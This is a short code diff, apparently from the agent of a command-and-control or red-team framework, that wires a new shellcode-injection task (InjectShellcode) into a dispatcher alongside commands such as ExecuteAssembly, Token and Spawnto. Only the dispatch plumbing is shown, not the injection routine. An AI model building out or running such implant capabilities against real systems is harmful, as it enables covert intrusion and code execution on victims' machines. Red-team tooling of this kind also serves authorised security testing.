@@ -12,6 +12,7 @@
 #include "Tasks/Upload.h"
 #include "Tasks/InlineExecute.h"
 #include "Tasks/ExecuteAssembly.h"
+#include "Tasks/InjectShellcode.h"
 #include "Tasks/Token.h"
 #include "Tasks/Exit.h"
 
@@ -292,6 +293,14 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
         {
             _dbg("SPAWNTO_CMD was called");
             AgentSpawnto(taskUuid, taskParser);
+            return;
+        }
+#endif
+#ifdef INCLUDE_CMD_INJECT_SHELLCODE
+        case INJECT_SHELLCODE_CMD:
+        {
+            _dbg("INJECT_SHELLCODE_CMD was called");
+            InjectShellcode(taskUuid, taskParser);
             return;
         }
 #endif
